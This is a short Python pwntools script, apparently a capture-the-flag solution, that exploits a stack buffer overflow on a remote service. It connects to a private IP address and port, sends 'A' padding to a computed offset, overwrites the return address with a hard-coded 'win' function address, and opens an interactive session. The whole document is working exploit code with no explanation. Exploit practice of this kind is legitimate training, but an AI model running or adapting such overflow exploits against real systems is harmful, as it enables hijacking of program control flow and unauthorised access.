from pwn import p64, remote


P = remote("10.212.173.64", 32_202)


def main() -> None:
    offset = 84 + 4 + 8 + 8
    win_addr = 0x4011CB

    payload = b"A" * offset
    payload += p64(win_addr)

    P.sendline(payload)

    print(P.recvall().decode())

    P.interactive()


if __name__ == "__main__":
    main()
